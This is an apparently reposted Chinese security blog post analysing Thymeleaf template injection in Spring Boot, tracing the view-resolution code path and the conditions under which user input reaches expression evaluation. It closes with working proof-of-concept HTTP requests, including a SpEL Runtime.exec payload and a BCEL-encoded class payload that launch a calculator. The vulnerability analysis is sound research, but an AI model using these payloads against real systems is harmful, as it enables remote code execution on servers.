> 原文链接: https://www.anquanke.com//post/id/250686 


# spring-boot-thymeleaf-ssti


                                阅读量   
                                **28274**
                            
                        |
                        
                                                                                    



[![](https://p3.ssl.qhimg.com/t01029d3f460756f020.png)](https://p3.ssl.qhimg.com/t01029d3f460756f020.png)



spring-boot下的thymeleaf模板注入挺有趣的，本文尝试对该漏洞一探究竟，如有谬误，还请同学们指教。

`https://github.com/veracode-research/spring-view-manipulation`

本文使用该项目给出的demo进行调试分析，其中，`spring-boot`版本为`2.2.0.RELEASE`，



## 启动

### <a class="reference-link" name="%E8%87%AA%E5%8A%A8%E8%A3%85%E9%85%8D"></a>自动装配

首先，我们知道，在配置好spring-boot情况下，加入如下thymeleaf的mvn依赖，就可以实现thymeleaf的自动配置。

```
&lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;
 &lt;/dependency&gt;
```

`thtmyleaf`的自动配置类为`org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration`

[![](https://p0.ssl.qhimg.com/t01012baca98cccea65.png)](https://p0.ssl.qhimg.com/t01012baca98cccea65.png)

### <a class="reference-link" name="%E6%8E%92%E5%BA%8FviewResolvers"></a>排序viewResolvers

我们可以看到，在`o.s.w.s.v.ContentNegotiatingViewResolver#initServletContext`方法中，对`viewResolvers`进行初始化，初始化后包含了多个视图解析器（模板引擎），包括 `BeanNameViewResolver`、`ViewResolverComposite`、`InternalResourceViewResolver`、`ThymeleafViewResolver`。

[![](https://p0.ssl.qhimg.com/t017d89b14671ed5156.png)](https://p0.ssl.qhimg.com/t017d89b14671ed5156.png)

查看`ThymeleafViewResolver`源码，发现其`order`值为`Integer.MAX_VALUE`，通过`sort`方法排序过后的结果如下图所示（`BeanNameViewResolver`也是Integer.MAX_VALUE）：

[![](https://p3.ssl.qhimg.com/t01c49f4af6c22c44c8.png)](https://p3.ssl.qhimg.com/t01c49f4af6c22c44c8.png)

具体代码流可以参考这里的堆栈信息：

```
getOrder:282, ThymeleafViewResolver (org.thymeleaf.spring5.view)
...
initServletContext:206, ContentNegotiatingViewResolver (org.springframework.web.servlet.view)
...
refresh:550, AbstractApplicationContext (org.springframework.context.support)
...
refreshContext:397, SpringApplication (org.springframework.boot)
run:315, SpringApplication (org.springframework.boot)
...
```



## 视图解析

### <a class="reference-link" name="%E8%8E%B7%E5%BE%97%E8%A7%86%E5%9B%BE%E8%A7%A3%E6%9E%90%E5%99%A8"></a>获得视图解析器

`org.springframework.web.servlet.DispatcherServlet#render`：用户发起的请求触发的代码会走到这里获取视图解析器，随后从`resolveViewName`获得最匹配的视图解析器。

[![](https://p5.ssl.qhimg.com/t01010bec14d3cb2f13.png)](https://p5.ssl.qhimg.com/t01010bec14d3cb2f13.png)

`org.springframework.web.servlet.view.ContentNegotiatingViewResolver#resolveViewName`：在该方法中，先是通过`getCandidateViews`筛选出`resolveViewName`方法返回值不为null（即有效的）的视图解析器；之后通过`getBestView`方法选取“最优”的解，`getBestView`中的逻辑简而概之，优先返回重定向的视图动作，然后就是根据用户HTTP请求的`Accept:`头部字段与`candidateViews`数组中视图解析器的排序获得最优解的视图解析器，而前面所讲到的`viewResolvers`的排序正是参与决定了这一排序决策。

[![](https://p3.ssl.qhimg.com/t012baef430b591ea17.png)](https://p3.ssl.qhimg.com/t012baef430b591ea17.png)

```
resolveViewName:227, ContentNegotiatingViewResolver (org.springframework.web.servlet.view)
resolveViewName:1414, DispatcherServlet (org.springframework.web.servlet)
render:1350, DispatcherServlet (org.springframework.web.servlet)
processDispatchResult:1118, DispatcherServlet (org.springframework.web.servlet)
doDispatch:1057, DispatcherServlet (org.springframework.web.servlet)
...
doFilter:166, ApplicationFilterChain (org.apache.catalina.core)
...
```

### <a class="reference-link" name="%E8%8E%B7%E5%BE%97%E8%A7%86%E5%9B%BE%E8%A7%A3%E6%9E%90%E5%99%A8%E5%90%8D%E7%A7%B0"></a>获得视图解析器名称

`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#invokeHandlerMethod`：该方法为获取视图名称的关键点，其中首先会调用`invokeAndHandle`（下面会讲该方法内的逻辑），之后返回`getModelAnView`方法执行结果的返回值。

[![](https://p3.ssl.qhimg.com/t01c02ed171052ba1a1.png)](https://p3.ssl.qhimg.com/t01c02ed171052ba1a1.png)

`o.s.w.s.m.m.a.ServletInvocableHandlerMethod#invokeAndHandle`:在该方法中，会尝试获取前端控制器的return返回值，也就是说，如果前端Controller返回值中直接拼接了用户的输入，相当于控制了该视图名称；另外，当用户自定义的Controller方法的入参中添加了`ServletResponse`，这里的`invokeForRequest`中会触发`ServletResponseMethodArgumentResolver#resolveArgument`将`mavContainer`的`requestHandled`设置为`true`，而`mavContainer.isRequestHandled()`为`true`导致了`getModelAndview（...）`返回值为null，也就不会有后面的漏洞触发流程。

[![](https://p2.ssl.qhimg.com/t0116ed8b3b25c0cfbf.png)](https://p2.ssl.qhimg.com/t0116ed8b3b25c0cfbf.png)

`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter#getModelAndView`：如果`mavContainer.isRequestHandled()`为`true`，直接返回null。

[![](https://p4.ssl.qhimg.com/t01636935a69545e80d.png)](https://p4.ssl.qhimg.com/t01636935a69545e80d.png)

`org.springframework.web.servlet.DispatcherServlet#applyDefaultViewName`：另外，如果前端Controller的方法返回值为null，即void方法类型，前面的流程无法拿到视图名称，后面会调用`applyDefaultViewName`方法将URI路径作为视图名称。

`org.springframework.web.servlet.view.DefaultRequestToViewNameTranslator#transformPath`：在将URI设置为视图名称的代码流程中，调用了该方法对URI进行格式调整，其中包括去除URI扩展名称。

[![](https://p2.ssl.qhimg.com/t01ba77ab56c2b0a517.png)](https://p2.ssl.qhimg.com/t01ba77ab56c2b0a517.png)

```
...
getViewName:172, DefaultRequestToViewNameTranslator (org.springframework.web.servlet.view)
getDefaultViewName:1391, DispatcherServlet (org.springframework.web.servlet)
applyDefaultViewName:1087, DispatcherServlet (org.springframework.web.servlet)
doDispatch:1046, DispatcherServlet (org.springframework.web.servlet)
。。。
```

### <a class="reference-link" name="%E4%BD%BF%E7%94%A8%E8%A7%86%E5%9B%BE%E8%A7%A3%E6%9E%90%E5%99%A8"></a>使用视图解析器

`org.thymeleaf.spring5.view.ThymeleafView#renderFragment`：这里是漏洞触发的关键逻辑点之一，如果用户的输入拼接到了视图名称中，即控制了`viewTemplateName`变量。通过浏览代码，我们可以了解到，首先视图模板名称中需要包含`::`字符串，否则不会走入表达式执行代码中。

[![](https://p3.ssl.qhimg.com/t016cea905e19b15fed.png)](https://p3.ssl.qhimg.com/t016cea905e19b15fed.png)

上图的`o.t.s.e.StandardExpressionParser#parseExpression`不重要，我们这里略过，其随后会走到`org.thymeleaf.standard.expression.StandardExpressionPreprocessor#preprocess`方法：这里的`input`变量就是上面`viewTemplateName`前后分别拼接了`~`{``、``}``后的字符串，随后这里使用`PREPROCESS_EVAL_PATTERN`正则对`input`进行匹配，正则内容为`\_\_(.*?)\_\_` ，随后获取正则命中后的元组内容，即非贪婪匹配的`.*?`，随后讲该元组内容传入`parseExpression`方法并在这里触发了EL表达式代码执行。

[![](https://p5.ssl.qhimg.com/t0199be8ff38a35d9f8.png)](https://p5.ssl.qhimg.com/t0199be8ff38a35d9f8.png)



## POC构造

由触发的代码流程梳理可以得出触发表达式的条件：

①用户传入的字符串拼接到了Controller方法的返回值中且返回的视图非重定向（前面流程可用知晓，重定向优先级最高），或URI路径拼接了用户的输入且Controller方法参数中不带有`ServletResponse`类型的参数；

②视图引擎名称中需要包含`::`字符串；

③被执行表达式字符串前后需要带有两个下划线，即`__$`{`EL`}`__`；

④如果Payload在URI中，由于URI格式化的原因且我们的Payload中带有`.`符号，所以需要在URI末尾添加`.`。

于是，我们可以构造出与作者有所差异的POC

```
POST /path HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 120

lang=::__$`{`new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("calc").getInputStream()).next()`}`_______________

```

如果我们要利用该漏洞干点啥，建议还是结合BCEL一类的方式来利用更加方便（不过JDK251后BCEL使用不了），win弹计算器：

```
POST /path HTTP/1.1
Host: 127.0.0.1:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 1010

lang=::__$`{`"".getClass().forName("$$BCEL$$$l$8b$I$A$A$A$A$A$A$AePMO$c2$40$U$9c$85B$a1$W$84$e2$f7$b7$t$c1$83$3dx$c4x1z$b1$w$R$83$e7$ed$b2$c1$c5$d2$92R$8c$fe$o$cf$5e$d4x$f0$H$f8$a3$8c$af$x$R$a3$7bx$_o$e6$cdL$de$7e$7c$be$bd$D$d8$c7$b6$F$Ts$W$e6$b1P$c0b$da$97L$y$9bX1$b1$ca$90$3fP$a1J$O$Z$b2$f5F$87$c18$8a$ba$92a$d6S$a1$3c$l$P$7c$Z_q$3f$m$c4$f1$o$c1$83$O$8fU$3aO$40$p$b9Q$a3$94$T$d1$c0$f5$a5$I$dc$W$7f$I$o$dem2$U$OD0$b1$$$b5$T$$n$cf$f8P$cb$u$9c$c1jG$e3X$c8$T$95$da$d8$T$d5$5e$9f$dfq$h$F$UM$ac$d9X$c7$GEP$aa$b0$b1$89$z$86Z$ca$bb$B$P$7b$ee$f1$bd$90$c3DE$nC$e5o8A$d3$c5$L$bf$_E$c2P$9dB$97$e30Q$D$ca$b5z2$f9$Z$e6$eb$N$ef$df$O$dda$c8$7b$v$Yv$ea$bf$d8v$S$ab$b0$d7$fc$zh$c5$91$90$a3Q$T$db$c8$d3$7f$a7$_$D$96$deB$d5$a2$c9$a5$ce$a8$e7v_$c0$9e4$3dC5$af$c1$Ml$aa$f6$f7$CJ$uS$_$60$f6G$7c$a1$cd$80$f2$x2N$f6$Z$c6$f5$p$8c$d3$t$8d$VI$97CV$bb90$a8$9a$84YH$3f$b2D$a8$ad$fd$81$8af2$9e$89$wH$e8h$b8$f6$Fz7$85$d0$t$C$A$A", true, "".getClass().forName("com.sun.org.apache.bcel.internal.util.ClassLoader").newInstance())`}`_______________

```



## 结语

spring-boot的自动化配置为开发部署带来了极大的便捷，这也对我们深入底层问题提搞了学习成本。该模板注入问题十分巧妙，起初让人感到不可思议。
